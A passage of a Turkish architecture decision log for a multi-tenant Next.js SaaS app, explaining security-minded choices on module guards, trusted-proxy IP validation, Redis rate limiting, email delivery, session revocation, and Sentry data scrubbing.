  adları yazmak derlenmeyen bir katalog, var olmayan yollara link vermek ise kullanıcıyı 404'e
  götüren bir menü üretirdi.
- **`settings` şeması doğrulanmıyor**; bugün yalnızca okunur/yazılır bir `Json?` taşıyıcıdır
  (#151'in kendi "Scope Dışı" notu).

## Modül guard'ları ve modül-farkında menü (Issue #152)

`requireModule()` (API), `requirePageModule()` (sayfa) ve açık modüllere göre kurulan sidebar.

### Sıra kritiktir: önce kimlik, sonra modül

`requireModule()` **önce** `requirePermission()` çağırır (kimlik → aktif tenant → **canlı
membership** → rol → izin), **sonra** `isModuleEnabled()`. Ters sıra, kimliği doğrulanmamış bir
isteğin bir tenant'ın hangi modülleri açtığını **yoklamasına** izin verirdi: yanıt kodu, kimlik
kontrolünden önce modül durumuna göre değişirdi.

Bu, kolayca sessizce bozulabilecek bir invariant olduğu için `integration/tenant-scope-pattern.spec.ts`
statik olarak da doğruluyor — adımlar yer değiştirirse hiçbir davranış testi kırılmaz.

### Kapalı modül → 404, 403 DEĞİL

Kapalı bir modül o tenant için **var olmayan bir yüzeydir**; `docs/architecture.md`'nin status
sözlüğünde 404 zaten "yok ya da senin değil" anlamındadır. 403 dönmek, "bu özellik var ama sen
açmamışsın" bilgisini sızdırırdı — cross-tenant kayıtların 404 almasıyla aynı duruş (invariant #7).

### Modül durumu her istekte DB'den okunur

Aktif tenant cookie'sinin yalnızca bir **ipucu** olması ve membership'in her istekte
doğrulanmasıyla aynı duruş: kapatılan bir modül, kullanıcının bir sonraki isteğinde kapalıdır.
Cache eklenirse ayrı bir issue ve ayrı bir karar (#152'nin kendi "Scope Dışı" notu); pattern
testi, sessizce bir cache girmesini engelliyor.

### Menüde linki gizlemek YETKİLENDİRME DEĞİLDİR

`buildModuleNavLinks()` **saf** bir fonksiyondur (DB'ye gitmez, oturum okumaz) ve iki filtre
uygular: modül kapalıysa hiçbir linki görünmez; açık olsa bile linkin istediği izne sahip olmayan
role gösterilmez. Menü **sunucuda** kurulur — istemciye modül listesi ya da katalog gönderilmez.

Ama bu bir **UX kararıdır** (invariant #3): gerçek koruma guard'lardadır ve ikisi de ayrıca test
edilir. Linki gizlemek, elle URL yazan kullanıcıyı durdurmaz — `requirePageModule()` durdurur.

### Test edilebilirlik: enjekte edilebilir katalog

`buildModuleNavLinks(keys, role, definitions = MODULE_CATALOG)`. Gerçek katalog bugün (#151)
bilerek **boş `nav`** listeleriyle geliyor; kuralı ekranlar doğana kadar test edilemez bırakmamak
için `definitions` enjekte edilebilir tasarlandı ve testler kendi sentetik kataloglarını veriyor.
Ekranlar geldiğinde bu testler **değişmez**, yalnızca gerçek katalog dolar.

Ayrıca gerçek katalogla "bugün hiçbir link üretilmiyor" testi var: birinin var olmayan bir ekranı
menüye eklemesini yakalar.

### Bilinen sınır: guard'ın HTTP testi #156 ile geliyor

`requireModule()`'ün "kapalı modül → 404" davranışı ancak **korunan bir endpoint** üzerinden
uçtan uca sınanabilir; katalogdaki iki modülün bugün hiçbir endpoint'i yok. Bu yüzden bu PR
guard'ın **sıra ve yanıt invariant'larını statik olarak**, menü kuralını ise **davranışsal
olarak** doğruluyor; `security/module-guard-security.spec.ts` ilk korunan yüzeyle (#156, CRM
kurumları) birlikte yazılacak ve #152'nin kendi kabul kriterini orada tamamlayacak.

Alternatif — guard'ı test etmek için sahte bir endpoint eklemek — üretim kodunda yalnızca test
için var olan bir yüzey bırakırdı; reddedildi.

## Modül yönetim ekranı (Issue #153)

`/settings/modules` — OWNER'ın tenant'ında hangi modüllerin açık olduğunu görüp değiştirdiği
ekran. Menüde "Yönetim" grubunda, **yalnızca yetkisi olana** görünen bir "Modüller" öğesi var.

### Açma onay istemez, kapatma ister

Asimetri bilinçli: **açmak geri alınabilir** ve bir şey kaybettirmez; **kapatmak** bir ekibin
çalıştığı yüzeyi ortadan kaldırır. Onay metni, kullanıcının en çok korktuğu soruyu önceden
yanıtlar: *"Modül kapatıldığında verileriniz silinmez; yalnızca erişim kapanır."*

Onay iki adımlıdır, `window.confirm()` **değil** (`delete-with-confirm.tsx` ile aynı duruş):
tarayıcı diyaloğu stillenemez, ekran okuyucuda bağlam taşımaz ve sonucu anlatacak yer bırakmaz.

### Bağımlılık hatası ENGELİN ADIYLA gösterilir

Backend'in İngilizce iç metni kullanıcıya **gösterilmez** (auth ekranlarındaki duruş). 409
durumunda mesaj engeli adıyla yazar — *"Bu modülü açmak için önce şunları açın: CRM & Süreç
Takibi."* Bunun için gereken etiketler **sunucudan prop olarak** gelir; istemci katalogdan bilgi
türetmez.

Kartlar bağımlılığı **kapalıyken de** gösterir ("Gerektirir: …", "Şunlar buna bağlı: …"):
kullanıcı "Aç"a basmadan önce neyin gerektiğini bilmeli, 409'u deneyerek öğrenmemeli.

`503` de ayrı ele alınır ("Şu anda yoğunluk var, birkaç saniye sonra tekrar deneyin") — geçici
bir yazma çakışmasıdır (`runSerializable`), iş kuralı ihlali değil.

### Yetki üç katmanda

1. **Menü**: link yalnızca `MANAGE_MODULES` olana gösterilir — ADMIN/MEMBER'ı kesin bir
   yönlendirmeye davet etmemek için (`EmptyState`in "yetkisi olmayana eylem gösterme" kuralı).
2. **Sayfa**: izni olmayan `/dashboard`'a yönlendirilir.
3. **API**: `PATCH .../modules/:moduleKey` zaten `requirePermission(MANAGE_MODULES)` ile korunur.

İlk ikisi **UX kararıdır** (invariant #3); asıl koruma üçüncüsüdür ve E2E bunu ayrıca doğrular —
ADMIN'in elle yaptığı `PATCH` **403** alır.

### Neden `/settings/modules`, menüde ayrı bir öğe

"Ayarlar" öğesi tenant ayarları ekranının (#86) placeholder'ı olarak duruyor; modülleri oraya
bağlamak, henüz yazılmamış bir ekranın yerini işgal etmek olurdu. "Modüller" öğesi o
placeholder'ın **önüne** eklenir: gerçek bir ekranı olan öğe, olmayanın üstünde durmalı.

### Bilinen sınır: e2e'nin "menüde görün" yarısı #160'a kaldı

#153'ün kabul kriteri *"modül aç → menüde görün → kapat → menüden kaybol"* diyor. Menü tarafı
bugün **doğrulanamaz**: katalogdaki modüllerin `nav` listeleri hâlâ boş (ekranlar #160+ ile
gelecek), dolayısıyla açık bir modül menüye hiçbir link eklemiyor. Mekanizmanın kendisi #152'de
saf fonksiyon olarak test edildi; ekran gelince e2e'nin bu yarısı da yazılacak.

E2E bugün şunu doğruluyor: aç/kapat, onay metni, vazgeçme, iki yönlü bağımlılık hatası (adıyla),
ADMIN'in sayfaya erişememesi + linki görmemesi + API'den 403 alması, ve OWNER kontrol grubu.

## Güvenilir proxy zorunluluğu (Issue #182)

Rate limiting'in tamamı, istemcileri IP'ye göre ayırmaya dayanır ve IP `x-forwarded-for`
header'ından okunur. Bu issue'ya kadar header **koşulsuz ve doğrulamasız** okunuyordu; "önümüzde
güvenilir bir proxy var" varsayımı yalnızca yorumlarda ve bu dosyada yazılıydı, kodda hiçbir
zorlayıcı yoktu.

### İki ayrı açık kapatıldı

**1. Proxy'siz deployment.** Uygulama doğrudan internete açılırsa `x-forwarded-for`'u istemcinin
kendisi yazar; her istekte farklı bir değer göndererek her seferinde yeni bir bucket'a düşmek
ve rate limit'i tamamen etkisiz kılmak mümkündü. Artık `TRUSTED_PROXY` **production'da açıkça
yazılmak zorunda** (`src/lib/config/trusted-proxy.ts`) ve `false` iken header hiç okunmaz.

**2. Biçim doğrulaması yokluğu.** Bu daha sinsiydi ve proxy VARKEN de sömürülebilirdi: çoğu
proxy (`nginx`'in `$proxy_add_x_forwarded_for`'u dahil) istemcinin gönderdiği değeri **korur ve
sonuna ekler**. Yani istemci `x-forwarded-for: aaaa1` gönderirse header `aaaa1, <gerçek-ip>`
olur ve uygulama ilk segmenti — saldırganın uydurduğu değeri — okurdu. Doğrulama olmadığı için
`aaaa1`, `aaaa2`, … **sınırsız sayıda geçerli bucket key'i** üretiyordu. Artık ilk segment
`node:net`'in `isIP()`'siyle doğrulanır; uymayan her değer tek bir paylaşılan `unknown`
bucket'ına çöker.

Bu ikinci maddenin pratik sonucu: `docs/deployment.md`'deki nginx örneği
`$proxy_add_x_forwarded_for` **değil** `$remote_addr` kullanır — header'ı korumak değil, ezmek
gerekir.

### Neden sessiz varsayılan yok

`TRUSTED_PROXY` production'da tanımsızsa uygulama bilerek hata verir (`APP_BASE_URL` ile aynı
duruş). İki yönde de sessizce yanlış olabilirdi: varsayılan `true` olsaydı proxy'siz bir
deployment "korumalı" görünürdü; `false` olsaydı proxy'li normal bir deployment tüm trafiği tek
sayaca sıkıştırıp gerçek kullanıcıları birbirine bağlardı. `"true"`/`"false"` dışındaki değerler
de reddedilir — gevşek ayrıştırma (`value !== "false"`) yazım hatasını sessizce "güveniyoruz"a
çevirirdi.

### `node:net` neden bağımlılık sayılmaz

`isIP()` Node'un yerleşik modülüdür; şifre hash'i için `node:crypto` kullanmakla aynı duruş.
IPv6 ayrıştırmasını elle yazmak (`::` kısaltması, IPv4-mapped biçimler, zone id'ler) hem uzun
hem hataya açıktır ve yanlış bir doğrulayıcı meşru IP'leri `unknown`'a düşürüp gerçek
kullanıcıları birbirine bağlardı — yani güvenlik düzeltmesi bir kullanılabilirlik hatasına
dönüşürdü.

### `TRUSTED_PROXY=false` iken uzak adres kullanılmıyor

Issue, bu durumda "bağlantının kendi uzak adresi"nin kullanılmasını öngörüyordu. **Next.js
16'da bu adres bir Route Handler'a açılmıyor**: `NextRequest.ip` bu sürümde yok ve uygulama
edge/middleware kullanmıyor (doğrulandı:
`node_modules/next/dist/server/web/spec-extension/request.d.ts`). Bu yüzden issue'nun
"bulunamıyorsa ortak `unknown` bucket'ına düşülür" dalı bugün tek geçerli daldır. Kalan risk
kayda geçmiştir: `false` seçen bir kurulumda tüm kullanıcılar aynı sayacı paylaşır ve meşru
trafik 429 alabilir. Doğru cevap `false` seçmek değil, proxy'yi kurmaktır.

### Test yardımcısı da değişti

`e2e/support/rate-limit.ts`'teki `uniqueTestClientIp()` eskiden `test-<uuid>` döndürüyordu — bu
değerler tam olarak yeni doğrulayıcının reddettiği biçimdeydi. Helper artık RFC 3849'un
dokümantasyon bloğundan (`2001:db8::/32`) benzersiz ve **geçerli** IPv6 adresleri üretir.
Değiştirilmeseydi ~20 test dosyası ortak `unknown` bucket'ına düşüp birbirini 429'a
düşürürdü. `integration/trusted-proxy.spec.ts` bu ayrışmayı kalıcı olarak yakalar.
## E-posta sağlayıcısı (Issue #180)

Şifre sıfırlama ve tenant daveti akışları, bu issue'ya kadar production'da **gerçekten
çalışmıyordu**: `consoleEmailSender` yalnızca alıcıyı logluyordu. Kullanıcı "e-postanı kontrol
et" mesajını görüyor, hiçbir şey gelmiyordu. Bu, ürünü tek başına satılamaz kılan boşluktu.

### Sağlayıcı kararı: Resend, HTTP API üzerinden, SDK'sız

**Seçilen:** [Resend](https://resend.com) — HTTP API, SMTP credential gerektirmez, ücretsiz
katmanı geliştirme için yeterli.

**SDK (`resend` npm paketi) REDDEDİLDİ.** Paketin bu kullanım için yaptığı tek şey tek bir
POST isteğini sarmalamak. Bu repo şifre hash'i için `bcrypt` yerine Node `crypto`, doğrulama
için `zod` yerine elle yazılmış saf fonksiyonlar kullanıyor (`docs/conventions.md` →
"Bağımlılıklar"); on beş satırlık bir `fetch` çağrısı için bağımlılık eklemek bu duruşla
çelişirdi. **Bu PR hiçbir npm bağımlılığı eklemez.**

**SMTP + `nodemailer` REDDEDİLDİ.** Bir kütüphane ve credential yönetimi gerektirir; ayrıca
serverless/PaaS ortamlarında giden 587/465 portu sık sık kapalıdır. HTTP API her yerde çalışır.

**AWS SES DEĞERLENDİRİLDİ.** Ölçekte daha ucuz, ama kurulumu (IAM, domain doğrulama, sandbox'tan
çıkma talebi) ilk müşteriye giden yolu uzatıyor. `EmailSender` arayüzü zaten yerinde olduğu
için SES'e geçmek yeni bir dosya ve bir `EMAIL_PROVIDER` değeri eklemekten ibarettir.

### Yanlış yapılandırma production'da GÜRÜLTÜLÜ başarısız olur

`APP_BASE_URL` ile **birebir aynı** karar ve aynı gerekçe: production'da `EMAIL_PROVIDER`
eksikse veya `console` ise uygulama bilerek hata verir (`src/lib/config/email.ts`). Sessizce
`console`'a düşmek, "e-posta gönderdim" diyen ama göndermeyen bir sistem üretir ve bu **fark
edilmez**. Aynı sertlik tanınmayan sağlayıcı adları için de geçerlidir: `EMAIL_PROVIDER=resned`
her ortamda hata verir, çünkü yazım hatası olan bir production yapılandırmasının sessizce
çalışıyor görünmesi tam olarak engellenmek istenen şeydir.

### Çağrı sırası bir güvenlik gerekliliğidir

`getEmailSender()` de `getAppBaseUrl()` gibi **her DB erişiminden önce** çözülür. Kullanıcı
okunduktan sonra çağrılsaydı, yanlış yapılandırılmış bir production'da "kayıtlı e-posta → 500,
kayıtsız e-posta → 200" farkı oluşur ve Issue #7'de kapatılan user-enumeration oracle'ı geri
gelirdi. İkisinin **birbirine göre** sırası da sabittir (önce `APP_BASE_URL`, sonra sağlayıcı):
güvenlik açısından fark yok, ama hangi hatanın çıkacağı belirlenimli olsun diye. Regresyon
testi: `integration/email-config.spec.ts`.

### Gönderim best-effort'tur, akışı düşürmez

`sendViaResend()` **throw etmez**, `boolean` döner. Sağlayıcı hata verse bile
`forgot-password` aynı 200'ü ve aynı genel mesajı döndürmeye devam eder — aksi halde
enumeration koruması (invariant #7) sağlayıcının durumuna bağlı hale gelirdi. Hata yalnızca
sunucuda loglanır. Kuyruk/retry **kurulmadı** (issue "Scope Dışı"); gönderim tek denemeliktir
ve 10 saniyelik bir zaman aşımı vardır, çünkü bu çağrı kullanıcının beklediği bir isteğin
ortasında yapılır.

### Raw token log kuralı gerçek sağlayıcıda DAHA katı

`consoleEmailSender` production dışında `resetUrl`'i logluyor — testlerin token'ı outbox'tan
okuyabilmesi için. `resendEmailSender` bunu **hiçbir ortamda** yapmaz: gerçek sağlayıcı
seçildiğinde token'ı loga yazmanın meşru bir gerekçesi kalmaz. Hata logları da sağlayıcının
yanıt gövdesini okumaz — sağlayıcılar hata gövdesinde isteğin bir kısmını yankılayabilir ve bu,
raw token taşıyan linki loga taşıyabilirdi. Regresyon testi:
`integration/email-sender-logging.spec.ts`.

### Test davranışı korundu

`.test-outbox` / `.test-outbox-invitations` dosya tabanlı akışı **değişmedi** ve yalnızca
`NODE_ENV !== "production"` içindir. Testler `EMAIL_PROVIDER=console` ile çalışır; gerçek
sağlayıcı CI'da hiç çağrılmaz. `resendEmailSender`'ı test eden yerlerde `fetch` stub'lanır —
stub'lanan şey bir güvenlik mekanizması değil, üçüncü taraf bir HTTP sınırıdır.

### Kalan riskler ve kapsam dışı

- **Manuel doğrulama gerekir:** gerçek bir Resend anahtarıyla uçtan uca teslim, bu PR'da
  otomatik test edilemez (ücretli/ağa bağımlı). PR açıklamasında belirtilir.
- **SPF/DKIM/DMARC ve özel alan adı** bir deployment adımıdır, kod değişikliği değil — #90'a
  aittir.
- **Bounce/complaint yönetimi, gönderim istatistikleri, e-posta kuyruğu** kapsam dışıdır.
- **Bildirim e-postaları** Epic 9'un (#74), **e-posta doğrulama akışı** #190'ın konusudur.

## Dağıtık rate limiting (Issue #181)

`InMemoryRateLimiter` **process-local**'dir. Çok instance'lı veya serverless bir deployment'ta
her instance kendi sayacını tutar (gerçek limit instance sayısıyla çarpılır) ve cold start
sayacı sıfırlar — saldırgan yeni instance'lara dağılarak limiti pratikte etkisiz kılabilir.
Yani brute-force koruması kodda **vardı** ama production'da **yok sayılabilirdi**.

`RateLimiter` arayüzü (#27) tam bu değişim için yazılmıştı: **route kodu ve `checkRateLimit()`
sözleşmesi hiç değişmedi**, yalnızca `limiter.ts`'teki seçim satırı genişledi.

### Atomiklik — bu işin çekirdeği

`InMemoryRateLimiter.consume()` içinde tek bir `await` yoktur; oku+hesapla+yaz tek senkron
bloktur ve JavaScript'in tek thread'li event loop'unda bu **atomiktir**. Redis'e geçerken bu
garanti kaybolur: "oku → hesapla → yaz" üç ayrı ağ çağrısı olur ve eşzamanlı istekler limiti
aşabilir (klasik TOCTOU).

Bu yüzden tüm sliding-window mantığı **tek bir Lua script'inde**, Redis'in kendi tek thread'li
yürütmesi altında çalışır: `ZREMRANGEBYSCORE` → `ZCARD` → (koşullu) `ZADD` → `PEXPIRE`.

**`MULTI/EXEC` reddedildi:** koşullu yazma (yalnızca izin verilirse `ZADD`) bir transaction
içinde ifade edilemez — karar için önce `ZCARD` sonucunu okumak, yani transaction'ı bölmek
gerekirdi.

**Reddedilen deneme bucket'a yazılmaz** (in-memory davranışın aynısı). Aksi halde limiti aşan
bir saldırgan, her reddedilen denemeyle pencereyi uzatıp meşru kullanıcıyı süresiz kilitleyebilirdi.

**Üye adı benzersizdir** (`<ms>-<rastgele>`): aynı milisaniyedeki iki istek aynı üye adını
paylaşsaydı `ZADD` ikincisini yeni bir giriş saymaz, üzerine yazardı — iki istek bir sayılır ve
limit sessizce gevşerdi.

### Store erişilemezse: FAIL-OPEN

Redis'e ulaşılamadığında istek **geçirilir** ve hata loglanır.

**Gerekçe:** rate limiter yardımcı bir korumadır; Redis kesintisinde tüm giriş/kayıt akışını
kilitlemek, engellediği riskten daha büyük bir hasar üretir — tek bir üçüncü taraf servis,
uygulamanın tamamını erişilemez kılardı.

**Kabul edilen kalan risk:** kesinti süresince brute-force koruması yoktur. Fail-closed
isteniyorsa bu **ayrı bir karardır** ve bu satırın değiştirilmesini gerektirir.

Hata logu bucket key'ini (dolayısıyla istemci IP'sini) **içermez** (invariant #7).

### `@upstash/redis` paketi kullanılmadı

Paketin buradaki tek işi tek bir POST isteğini sarmalamak olurdu. Repo `bcrypt` yerine
`node:crypto`, `zod` yerine elle yazılmış doğrulama kullanıyor; **bu değişiklik hiçbir npm
bağımlılığı eklemez**. TCP yerine HTTP tercihi de bilinçli: serverless'ta kalıcı TCP havuzu her
cold start'ta yeniden kurulur ve bağlantı sayısı instance sayısıyla çarpılır.

### Yapılandırma sessizce zayıflamaz

`RATE_LIMIT_STORE` tanımsızsa `memory` kullanılır (lokal geliştirme ve testler bugünkü gibi
çalışır). Ama:

- Tanınmayan bir değer (`rediss` gibi bir yazım hatası) **her ortamda hata verir** — sessizce
  in-memory'ye düşmek, tam da bu issue'nun kapatmak istediği "koruma var sanılıyor ama yok"
  durumudur.
- `redis` seçiliyken credential eksikse **fırlatır**, sessizce in-memory'ye düşmez: operatör
  açıkça "paylaşılan store istiyorum" dedi.
- Seçilen store **başlangıçta bir kez loglanır** (`[rate-limit] store=...`). Production'da
  yanlışlıkla in-memory'ye düşmüş bir kurulumun bunu fark etmesinin tek yolu budur.

### Doğrulanmamış kalan

Lua script'inin Redis içindeki davranışı (pencerenin gerçekten kayması, `ZADD`'in gerçekten
yazması) **gerçek bir Upstash örneği gerektirir** ve bu repoda otomatik test edilmemiştir.
Otomatik testler bu sınıfın sözleşmesini doğrular: tek round-trip (atomiklik iddiasının kanıtı),
argüman şekli, yanıt çevrimi ve fail-open davranışı.
## Tüm oturumları kapatma (Issue #186)

Stateless JWT mimarisinde sign-out yalnızca istemcinin cookie'sini temizler — **çalınmış bir
token 8 saat boyunca geçerli kalmaya devam eder**. Bu, "CSRF Duruşu" ve "Session Revocation"
bölümlerinde kayda geçmiş bilinçli bir kabuldü, ama kullanıcının "şüpheli bir durum var, tüm
oturumlarımı kapatayım" diyebileceği hiçbir yol yoktu. Finansal bir üründe kurumsal müşterinin
soracağı ilk sorulardan biridir.

Çözüm ucuzdu: revocation altyapısı (#26) **zaten vardı**; tek eksik, şifre değişimi dışında da
tetiklenebilen bir zaman damgasıydı.

### İki zaman damgası, tek eşik

`User.sessionsRevokedAt` eklendi. `null` = hiç toplu iptal yapılmadı; mevcut kullanıcılar
migration'dan **etkilenmez** (`credentialsChangedAt` ile aynı mantık).

`isSessionRevoked()` artık ikisinin **en büyüğüne** bakar. Alanlar şemada **ayrı tutulur** ve bu
bilinçlidir: şifre değişimi ile kullanıcının kendi iradesiyle yaptığı toplu iptal farklı
olaylardır. Tek alana yazmak, "bu kullanıcının şifresi değişti mi" sorusunun cevabını bozardı —
audit kaydı ve ileride eklenecek "şifreniz değişti" bildirimi bu ayrımı ister.

`Math.max()` **kullanılmadı**: `Math.max(null, x)` `null`'ı `0`'a çevirir ve "hiç olmadı"yı
"1970'te oldu" gibi davranarak sessizce yanlış sonuç üretebilirdi.

**Hassasiyet kuralı aynen korundu.** `iat` saniye, zaman damgaları milisaniye; aynı saniyeye
denk gelen token, yanlış pozitif revocation'ı önlemek için geçerli sayılmaya devam ediyor
(`src/lib/auth/session-revocation.ts`'teki grace window). Yeni alan bu kuralı değiştirmez;
`integration/revoke-sessions.spec.ts` bunu duyarlılık testiyle birlikte sabitler.

**Ek DB maliyeti yok.** `jwt` callback'indeki sorgu zaten her istekte bu satırı okuyordu; yapılan
şey `select`'e bir alan eklemek — #113'teki `name` ile aynı gerekçe.

### Çağıranın kendi oturumu da düşer

`POST /api/auth/revoke-sessions` gövdesizdir ve hedef **yalnızca** trusted session'dan gelir
(invariant #2). Body'de `userId` göndermek etkisizdir — aksi halde bu endpoint "istediğim
kullanıcıyı sistemden at" aracına dönüşürdü; `security/revoke-sessions-security.spec.ts` bunu
açıkça test eder.

Kullanıcı **kendi** oturumundan da düşer. Stateless JWT'de "bu isteği yapan token"ı ayrıcalıklı
kılmanın yolu yoktur (bunu yapmak sunucu tarafında oturum kaydı tutmayı gerektirir — ayrı bir
mimari karar, #186 "Scope Dışı"). `change-password` de aynı nedenle aynı şekilde davranır ve
yanıt bunu kullanıcıya açıkça söyler; sessizce 401'e düşürmek, hatayı ürün hatası sanmasına yol
açardı.

### POST, GET değil

State değiştiren işlem (invariant #4). Bir `GET` olsaydı `SameSite=Lax` top-level cross-site
GET'leri engellemediği için herhangi bir sitedeki `<img src>` etiketi kullanıcıyı tüm
cihazlarından atabilirdi.

### Rate limit: 5/15dk

Endpoint authenticated ve idempotent olmasına rağmen limit gerekir: çalınmış bir cookie ile
tekrar tekrar çağrılırsa meşru kullanıcı sürekli dışarı atılır (kendine DoS). Kimse 15 dakikada
beşten fazla kez tüm cihazlarından çıkmaz.

### Ekran

`/settings/security` — menüde "Güvenlik". Sayfa `requirePageUser()` ile korunur ve
`resolveActiveTenantForUser()` **çağırmaz**: buradaki işlem kullanıcıya aittir, çalışma alanına
değil. Hiçbir çalışma alanına üye olmayan bir kullanıcı da oturumlarını kapatabilmelidir — aksi
halde en çok ihtiyaç duyulan düğme erişilemez bir ekranın arkasında kalırdı. Rol kontrolü de
yoktur; MEMBER dahil herkes kendi oturumlarını kapatır.

Onay iki adımlıdır (`window.confirm()` değil — `module-toggle.tsx` ile aynı duruş) ve onay metni
kullanıcının kendi cihazından da düşeceğini **önceden** söyler. Başarıdan sonra
`router.refresh()` değil **tam sayfa yönlendirme** yapılır: o noktada elimizdeki cookie artık
geçersizdir, `refresh()` 401 alıp kullanıcıyı yarı bozuk bir ekranda bırakırdı.

### Kapsam dışı

- **Aktif oturumların listelenmesi** ("şu cihazlardan giriş yapıldı") sunucu tarafında oturum
  kaydı tutmayı gerektirir ve mimariyi değiştirir. Ekranda bu sınır kullanıcıya açıkça yazılır;
  var olmayan bir özelliği ima etmemek için.
- **Yöneticinin başka bir kullanıcının oturumlarını düşürmesi** ayrı bir issue.
## Gözlemlenebilirlik: yapılandırılmış log ve istek kimliği (Issue #183)

Production'da bir şey patladığında elimizde yalnızca `console.error` vardı. Hangi kullanıcının,
hangi tenant'ta, hangi istekte hata aldığını öğrenmenin yolu yoktu; hatalar kullanıcı şikâyet
edene kadar görünmezdi.

### `x-request-id` — destek talebiyle log arasındaki tek bağ

Her yanıt bir `x-request-id` taşır. Kullanıcı "hata aldım" dediğinde bu id'yi verir, biz log'da
onu ararız. Gelen bir `x-request-id` varsa **korunur** (uygulamanın önündeki proxy zaten bir id
üretiyor olabilir; ezmek iki sistemin loglarını birbirine bağlamayı imkânsız kılardı), yoksa
üretilir.

**Gelen değer doğrulanır.** Bu değer log satırlarına yazılıyor; doğrulamasız kabul etmek
saldırganın satır sonu enjekte edip **sahte log kaydı** üretmesine izin verirdi (log injection).
Güvenli olmayan bir değer reddedilmez, **yok sayılır** ve yerine yenisi üretilir — bu bir
yetkilendirme aracı değil, izleme kolaylığıdır.

### `proxy.ts`, `middleware.ts` değil

Next.js 16'da `middleware` dosya konvansiyonu **kullanımdan kaldırıldı** ve `proxy` olarak
yeniden adlandırıldı; dev sunucusu açık bir deprecation uyarısı veriyor
(`node_modules/next/dist/docs/01-app/03-api-reference/03-file-conventions/proxy.md`). Dışa
aktarılan fonksiyonun adı da `proxy` olmak zorunda.

**Proxy'nin tek sorumluluğu istek kimliğidir.** Kimlik doğrulama ve yetkilendirme **oraya
taşınmadı** ve taşınmayacak: koruma `requireUser()`/`requirePermission()` guard'larındadır
(invariant #3); ikiye bölmek hangisinin geçerli olduğunu belirsizleştirirdi. Ayrıca proxy Edge
runtime'da çalışır ve Prisma'ya erişemez — canlı membership doğrulaması orada zaten mümkün değil.

Alternatif — `x-request-id`'yi her route handler'a elle eklemek — 20+ dosyaya tekrar eden kod
koyar ve yeni bir route yazıldığında **unutulur**.

### Yapılandırılmış log

`src/lib/observability/logger.ts` tek satır JSON üretir: `level`, `msg`, `time`, `requestId`,
`tenantId`, `userId`, `route`, `durationMs`.

**Bağımlılık eklenmedi.** `pino`/`winston`, burada ihtiyaç duyulanın (tek satır JSON) çok
ötesinde bir yüzey getirir; modül `console`'un ince bir sarmalayıcısıdır.

**Neden JSON:** `console.error("[audit] failed", {...})` insan okur, makine okuyamaz. "Şu
tenant'ta son bir saatte hata alan istekler" sorusu ancak alan bazlı aramayla yanıtlanır.

**`error` stderr'e, diğerleri stdout'a** yazar: log toplayıcıların uyarı/hata filtrelemesi bu
ayrıma dayanır.

**Bağlam alanları serbest bir `Record` değil, açık alanlardır** — hangi bilginin loglanabilir
olduğu tip düzeyinde belli olsun ve kimse oraya yanlışlıkla bir token koymasın. `extra` içinde
hassas veri bulunmaması **çağıranın sorumluluğudur**; `sanitizeMetadata()` gibi ikinci bir
savunma katmanı burada bilinçli olarak YOKTUR: log yazımı sıcak yolda çalışır ve her satırda
derin nesne taraması ölçülebilir bir maliyettir.

Mevcut üç `console.error` çağrısı (audit yazımı, e-posta gönderimi) bu logger'a taşındı.

### Sentry — hata izleme (BAĞLANDI)

`@sentry/nextjs` **onaylı bir bağımlılık olarak** eklendi (`CLAUDE.md` gereği açık onay alındı).

**`SENTRY_DSN` tanımlı değilse SDK hiç başlatılmaz.** `Sentry.init({ dsn: undefined })` çağırmak
da "kapalı" davranır ama SDK'nın global hook'larını (unhandled rejection, fetch sarmalayıcıları)
yine de kurar; hiç çağırmamak lokal geliştirme ve test ortamını gerçekten dokunulmamış bırakır.

**Yapılandırma tek kaynaktan gelir** (`src/lib/observability/sentry-config.ts`). Next.js üç ayrı
runtime için üç başlatma dosyası ister (`src/instrumentation-client.ts`, `sentry.server.config.ts`,
`sentry.edge.config.ts`); ayarları üç kez yazmak, birinde `sendDefaultPii`'yi veya `beforeSend`'i
unutmak demekti — ve o unutma **sessizdir**: Sentry çalışmaya devam eder, sadece kişisel veri
göndermeye başlar.

#### Kişisel veri gönderilmez — iki katman

1. **`sendDefaultPii: false`**, tipte `false` literal'i olarak sabitlendi: biri `true` yazmak
   isterse bunun bilinçli bir değişiklik olduğu diff'te görünür.
2. **`beforeSend` içinde `scrubEvent()`** — çünkü birincisi YETMEZ: uygulama kodunun kendi
   eklediği `extra`/`contexts` alanları ve hata mesajlarına gömülü URL'ler o ayarın kapsamı
   dışındadır. `writeAuditLog()`'un `sanitizeMetadata()` çağırmasıyla birebir aynı gerekçe.

`scrubEvent()` şunları yapar:

- **URL'lerin sorgu dizesini tamamen atar.** Şifre sıfırlama, davet ve e-posta doğrulama
  linklerinin hepsi raw token'ı `?token=` içinde taşır; bir hata raporunda tam URL, o token'ı
  Sentry'yi görebilen herkese verir. **Yalnızca `token` parametresi değil, sorgunun tamamı**
  atılır: hangi parametrenin hassas olduğunu tek tek saymak, ileride eklenen birini unutmaktır.
- **`cookie`, `authorization` ve `x-forwarded-for` başlıklarını atar.** Bir session cookie'si,
  hata raporunu görebilen herkese hesap devri imkânı verir.
- **`extra`, `contexts`, istek gövdesi ve breadcrumb verisini** `sanitizeMetadata()`'den geçirir.

`sentry-scrub.ts` **`@sentry/nextjs` import etmez** — saf fonksiyonlardır ve Sentry hiç
yapılandırılmamışken test edilirler. Testler ayrıca `beforeSend`'in gerçekten bağlandığını da
doğrular: doğru çalışan ama hiç çağrılmayan bir temizleyici, hiç yokmuş gibidir.

**`tracesSampleRate: 0`** — performans izleme kapalı. Trace'ler ayrı bir maliyet ve ayrı bir
veri akışıdır (URL'ler, sorgu süreleri); açılması ayrı bir karardır.

#### Kalan risk

- **Gerçek bir DSN ile uçtan uca doğrulama yapılmadı.** "Bilerek fırlatılan bir hata Sentry'de
  görünüyor ve içinde şifre/token/cookie yok" kriteri hesap gerektirdiği için manuel
  doğrulamaya bırakıldı. Temizleme mantığı 12 testle doğrulanmıştır, ama SDK'nın olayı
  gerçekten bu haliyle gönderdiği gözlenmedi.
- **Kritik olay alarmları** (5xx oranı, `SerializationConflictError` eşiği) kod değil, Sentry
  panosu yapılandırmasıdır.

## Saat dilimi: referans tenant'tır (Issue #134)

Üründe hiçbir saat dilimi katmanı yoktu ve **üç ayrı yer üç farklı referans** kullanıyordu:

| Yer | Eski referans |
| --- | --- |
| İşlem formu varsayılanı | Sunucunun **yerel** günü |
| Liste gösterimi (`toISOString().slice(0,10)`) | **UTC** günü |
| `Transaction.occurredAt` varsayılanı | Sunucunun **anı** |

Sunucu UTC ise fark görünmez — bu yüzden hata hem CI'da hem geliştirme makinesinde **sessiz**
